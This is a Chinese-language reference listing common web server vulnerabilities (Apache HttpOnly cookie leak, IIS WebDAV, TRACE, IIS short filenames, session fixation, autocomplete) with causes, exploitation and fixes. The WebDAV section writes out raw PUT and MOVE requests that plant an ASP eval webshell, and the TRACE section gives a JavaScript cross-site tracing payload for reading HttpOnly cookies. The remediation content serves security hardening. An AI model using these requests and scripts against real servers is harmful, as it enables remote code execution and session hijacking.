Apache HTTP Server “httpolny”cookie 泄露

1.为了防止XSS，我们通常采用给cookie附上httponly属性，来禁止js获取cookie.

2.原理：当Apache接收到了cookie长度超过4k，返回400，并且将所有的cookie信息返回，提示cookie过长.

3.利用：为用户的cookie添加一些无用信息，总长超过4k，使Apache返回400，并用过js正则过滤掉无用部分，我们就绕过了httponly的设置.

4.修复：受影响的版本为2.21及其之前的所有版本，做好备份，升级Apache.

IIS WebDav Options 方法未禁用

1.WebDav是基于HTTP1.1的扩展协议，集成在window xp和IIS中，定义了除了Get，Post等一些http协议基本方法之外的一些方法例如：Option,put,move等.

2.原理：使用option方法查看服务器允许哪些方法的提交，可能造成安全隐患.

3.利用：
-使用option探测服务器信息：

OPTIONS/HTTP/1.1
Host:www.xxxx.com

返回：

  HTTP/1.1 200 OK
  Date:Fri,01 Jan 2011 04:23:39 GMT
  Server: Microsoft-IIS/6.0
  X-Powered-By:ASP.NET
  MS-Author-Via:DAV
  Content-Length:0
  Accept-Ranges:none
  DASL:<DAV:sql>
  DAV:1.2
Public:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
Cacha-Control:private

-上传文本文件：

PUT/test.txt HTTP/1.1
Host:www.xxxx.com
Content-Length:26
<%eval(request("cmd"))%>

返回：

HTTP/1.1 200 OK
  Date:Fri,01 Jan 2011 04:23:39 GMT
  Server: Microsoft-IIS/6.0
  X-Powered-By:ASP.NET
location：***********
Allow:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
//上传成功

-通过MOVE改名(需要IIS勾选允许脚本资源访问复选框)：

MOVE/test.txt HTTP/1.1
Host:wwww.xxxx.com
Destination:http://www.xxxx.com/webshell.asp

返回：

HTTP/1.1 201 Created
  Date:Fri,01 Jan 2011 04:23:39 GMT
  Server: Microsoft-IIS/6.0
  X-Powered-By:ASP.NET
location：www.xxxx.com/webshell.asp
Content-type:text/xml
Content-length:0
//修改成功

4修复：属于服务器配置不当造成的安全问题，options PUT DELETE MOVE方法如非必须请关闭.

TRACE 方法未禁用

1.TRACE是HTTP协议提供的协议调试方法，发送什么请求，它会将请求原封返回.
可能存在的危害是能够与XSS配合获取用户httponly的cookie内容.

2.原理：客户端JavaScript提出一个TRACE请求，并读取这个请求的响应，那么这段脚本就能够访问标记为HttpOnly的cookie，即使通过document.cookie属性也无法访问它们.

3.利用：

<script type="text/javascript">  
<!--  
function xssTRACE(){  
var xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");  
xmlHttp.open("TRACE","http://wmjie.51.net/swords/",false);  
xmlHttp.send();  
xmlDoc=xmlHttp.responseText;  
alert(xmlDoc);  
}  
//-->  
</script>  
<INPUT TYPE=BUTTON onClick="xssTRACE();" VALUE=’XSS TRACE’>
//将如上恶意代码插入页面，一个正常用户通过这个被劫持的页面进行访问，即使是设置属性httponly的cookie也通过TRACE方法的请求，显示在返回页面中.

4.修复：属于服务器配置不当造成的安全问题，TRACE方法，如非必须请关闭.

IIS短文件名泄露

1.如果网站是运行在IIS服务器上，可以通过”~”来发现一些文件和文件夹,攻击者可以发现重要的文件或者文件夹，如果这些文件或者文件夹是正规的可见文件.攻击者可以通过该途径搜集文件名称(字符长度不超过6).
2.原理：使用通配符*和?发送一个请求到iis,当IIS接收到一个文件路径中包含”~”的请求时，它的反应是不同的.基于这个特点，我们可以根据http的响应区分一个可用或者不可用的文件.
3.修复：

  • 过滤~字符.

  • Windows中禁用8.3格式文件名方法如下(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)：

    cmd> fsutil 8dot3name query c:
    “c:”表示查询C盘的状态.
    如果功能被启用，会显示类似如下的信息：

    Disable8dot3 的卷状态为 0 (8dot3 名称创建已启用).
    NtfsDisable8dot3NameCreation 的注册表状态为默认值 2 (卷级别设置).
    基于以上的两个设置，在 c: 上启用 8dot3 名称创建.

如果在C盘上关闭这个功能，则可使用以下命令：

cmd> fsutil 8dot3name set C: 1
//0（全部启动），1（全部禁用），2（每个盘符单独设置），3（除系统盘外全部禁用）.

也可以通过修改注册表实现：

键：HKLM\SYSTEM\CurrentControlSet\Control\FileSystem
值：NTFSDisable8dot3NameCreation  类型：REG_DWORD
  • 使用waf进行防护.

会话标识别未更新

1.会话标识别未更新

2.原理：用户的登录页面会有一个session id，登录成功后，应该使用新的session id 而不是保持登录页面的session id， 这样即使别人在网络上截获了你的登录页面的session id，仍然无法伪造客户身份进入系统.
如果使用同样的session id，则可能被截获并且伪造客户身份进入系统.

3.修复：
-始终生成新的会话，供用户成功认证时登录.
-防止用户操纵会话标识.
-请勿接受用户浏览器登录时所提供的会话标识.

敏感信息泄露

1.以电话号码泄露为例

2.原理：敏感信息(电话号码，内网IP)显示在了页面，源码，url地址中.

3.利用：可作为进一步渗透的信息储备

4.修复：此号码网站业务正常，无实际安全影响，站点可根据网站自身情况是否去除号码.

缺少httponly属性

1.会话cookie中缺少HttpOnly属性会导致攻击者可以通过程序(JS脚本、Applet等)获取到用户的cookie信息，造成用户cookie信息泄露，增加攻击者的跨站脚本攻击威胁.

2.修复：
向所有会话cookie中添加“HttpOnly”属性.

Java示例：
HttpServletResponse response2 = (HttpServletResponse)response;
response2.setHeader( "Set-Cookie", "name=value; HttpOnly"); 

C#示例：
HttpCookie myCookie = new HttpCookie("myCookie"); 
myCookie.HttpOnly = true; 
Response.AppendCookie(myCookie);

VB.NET示例：
Dim myCookie As HttpCookie = new HttpCookie("myCookie") 
myCookie.HttpOnly = True 
Response.AppendCookie(myCookie)

启用不安全的HTTP方法

1.检测到目标Web服务器配置成允许下列其中一个（或多个）HTTP 方法：DELETE, SEARCH,COPY,MOVE, PROPFIND, PROPPATCH, MKCOL ,LOCK ,UNLOCK.这些方法表示可能在服务器上使用了 WebDAV.由于dav方法允许客户端操纵服务器上的文件，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件.
2.利用：
参考：

IIS WebDav Options 方法未禁用

3.修复：
如果服务器不需要支持WebDAV，请禁用.
或者为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码.

目标web应用表单密码类型输入启用了自动完成操作

1.在web应用form表单中，如果input标签没有指定“autocomplete”属性为“off”，则“autocomplete”的属性会自动默认为“on”.
当web应用form表单中的密码类型的input标签的“autocomplete”属性为“on”时，用户若提交了一个新的用户名和密码时，浏览器将会询问用户是否保存该用户名和密码信息.
如果用户选择保存，则之后在显示该web应用表单时，用户名和密码将会被自动填充到对应的输入框中.
用户一但保存密码，攻击者就可以通过本地从浏览器缓存中获取明文密码，导致用户敏感信息泄露.

2.修复：
修改web应用form表单中密码类型input标签的“autocomplete”属性为“off”.

示例：

<input type="password" name="password">
则增加“autocomplete”属性为“off”即可，修改为：
<input type="password" name="password" autocomplete="off">
